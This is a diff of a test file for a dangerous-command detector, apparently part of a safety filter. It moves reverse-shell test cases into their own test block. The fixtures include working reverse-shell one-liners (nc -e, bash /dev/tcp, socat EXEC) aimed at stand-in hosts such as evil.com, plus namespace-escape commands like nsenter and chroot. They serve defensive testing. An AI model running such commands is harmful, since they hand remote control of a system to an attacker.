@@ -803,11 +803,6 @@ describe("isDangerousCommand", () => {
     ["apt upgrade <pkg>", "apt upgrade evil-pkg", "untrusted-package-installation"],
     ["apt-get upgrade <pkg> with flag", "apt-get upgrade -y evil-pkg", "untrusted-package-installation"],
     ["snap refresh <pkg>", "snap refresh evil-snap", "untrusted-package-installation"],
-    ["nc -e /bin/bash reverse shell", "nc -e /bin/bash evil.com 4444", "reverse-shell"],
-    ["nc -e sh reverse shell", "nc -e sh attacker.com 1234", "reverse-shell"],
-    ["bash /dev/tcp redirect", "bash -i >& /dev/tcp/evil.com/4444 0>&1", "reverse-shell"],
-    ["socat EXEC reverse shell", "socat EXEC:bash tcp:evil.com:4444", "reverse-shell"],
-    ["socat EXEC with full path", "socat EXEC:/bin/sh,pty tcp:10.0.0.1:9001", "reverse-shell"],
     ["nsenter host namespace escape", "nsenter -t 1 -m -u -i -n bash", "namespace-escape"],
     ["chroot filesystem escape", "chroot /host /bin/bash", "namespace-escape"],
     ["unshare user namespace shell", "unshare --user bash", "namespace-escape"],
@@ -2438,6 +2433,18 @@ describe("category: git-stash-destruction", () => {
 
   it("does not flag git stash list", () => {
     expect(isDangerousCommand("git stash list")).toBeNull();
+  });
+});
+
+describe("category: reverse-shell", () => {
+  it.each([
+    ["nc -e /bin/bash", "nc -e /bin/bash evil.com 4444"],
+    ["nc -e sh", "nc -e sh attacker.com 1234"],
+    ["bash /dev/tcp redirect", "bash -i >& /dev/tcp/evil.com/4444 0>&1"],
+    ["socat EXEC:bash", "socat EXEC:bash tcp:evil.com:4444"],
+    ["socat EXEC:/bin/sh", "socat EXEC:/bin/sh,pty tcp:10.0.0.1:9001"],
+  ])("blocks %s", (_desc, command) => {
+    expect(isDangerousCommand(command)).toBe("reverse-shell");
   });
 });
 
